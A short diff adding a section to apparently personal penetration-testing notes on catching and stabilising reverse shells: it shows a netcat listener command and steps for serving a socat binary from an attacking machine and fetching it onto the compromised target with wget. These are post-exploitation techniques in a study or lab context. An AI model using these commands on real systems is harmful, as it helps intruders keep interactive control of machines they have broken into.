@@ -104,3 +104,15 @@ rlwrap nc -lvnp <port_number>
 
 * rlwrap gives us access to history, tab autocompletion, and the arrow keys immediately upong receiving a shell (Some manual stabilisation may be required if you want to be able to use CTRL + C inside the shell)
 * Particularly used when dealing with Windows shells since they're usually difficult to stabilise
+
+## Netcat Shell Stabilization Using Socat
+
+```Bash
+# 1. Create a webserver on the attacking machine inside the directory containing your socat static compiled binary
+sudo python3 -m http.server 80
+
+# 2. Use the netcat shell that's connected to the target machine to download the socat static compiled binary
+wget <attacking_machine_address>/<socat_static_compiled_binary_file> -O /tmp/socat
+```
+
+* Limited to Linux targets (Socat shells on Windows are usually no more stable than a netcat shell)
